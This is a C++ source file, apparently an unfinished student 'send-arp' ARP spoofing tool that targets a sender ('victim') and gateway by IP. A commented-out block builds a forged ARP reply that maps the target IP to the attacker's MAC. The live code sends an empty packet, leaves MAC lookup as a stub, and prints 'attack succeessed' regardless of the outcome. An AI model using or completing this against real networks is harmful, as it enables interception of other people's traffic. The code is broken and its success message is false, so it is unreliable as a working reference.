#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#include <stdio.h>
#include <iostream>
#include <libnet.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)


void usage() {
	//printf("syntax: send-arp-test <interface>\n");
	//printf("sample: send-arp-test wlan0\n");
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");

}

EthArpPacket packet;

//참조코드(MAC주소 가져오는 함수)
void getMacAddress(char * uc_Mac, char *iface){
	int fd;

	struct ifreq ifr;
	unsigned char *mac;

	fd = socket(AF_INET, SOCK_DGRAM, 0);

	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name , (const char *)iface , IFNAMSIZ-1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);

	close(fd);

	mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;

	//display mac address
	sprintf((char *)uc_Mac,(const char *)"%.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n" , mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

}


string getIpAddress(char* dev){
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0){
		perror("socket");
		return("Error");
	}

	char ip_address[INET_ADDRSTRLEN];
	//Ip ip_address;
	strncpy(ifr.ifr_name, dev, IFNAMSIZ);
	ifr.ifr_name[IFNAMSIZ]='\0';

	//get interface information
	if(ioctl(s, SIOCGIFADDR, &ifr) < 0){
		perror("ioctl");
		close(s);
		return("Error");
	}
	inet_ntop(AF_INET, &((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr, ip_address, INET_ADDRSTRLEN);
	close(s);
	return (ip_address);
}


//get Sender's Mac by Ip
int GetSenderMac(pcap_t* handle, Ip myIp, Mac myMac, Ip senderIp, Mac* senderMac) {

    return 0;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2){
		usage();
		return -1;
	}

	//print my(attacker's) Information(Mac, Ip)
	char myMac[32] = {0};
	string myIp;
	myIp = getIpAddress(argv[1]);
	getMacAddress(myMac, argv[1]);
	cout<<"my Mac   Address : " << myMac;
	cout<<"my IP    Address : " << myIp <<endl;

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	//Ip	myIp;
	//Mac	myMac;

	Mac	senderMac;
	Ip	senderIp;
	Mac	targetMac;
	Ip	targetIp;

	for (int i = 0; i < argc-2; i += 2){
		senderIp = Ip(argv[2+i]);
		targetIp = Ip(argv[2+i+1]);
		
		printf("sender Ip: %s\n", string(senderIp).c_str());
		printf("target Ip: %s\n", string(targetIp).c_str());
		/*senderMac = getSenderMac(handle, senderIp, myMac, myIp);
		if (senderMac == 1) {
			printf("can't find victim's Mac Address\n");
			pcap_close(handle);
			return 0;
		}
		//targetMac = getSenderMac(handle, targetIp, myMac, myIp);

		//sendArpPacket
		packet.eth_.dmac = senderMac;
		packet.eth_.smac = myMac;
		packet.eth_.type = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_pro_ = htons(EthHdr::Ip4);
		packet.arp_hln = Mac::SIZE;
		packet.arp_pln = IP::SIZE;
		packet.arp_op = htons(ArpHdr::Reply);//0: Request, 1: Reply

		packet.arp_.smac_ = myMac;
		packet.arp_.sip_ = htonl(targetIp);
		packet.arp_.tmac_ = senderMac;
		packet.arp_.tip_ = htonl(senderIp);
*/

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		
		if (res != 0){
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		printf("attack succeessed\n");
	}
	
	pcap_close(handle);
}
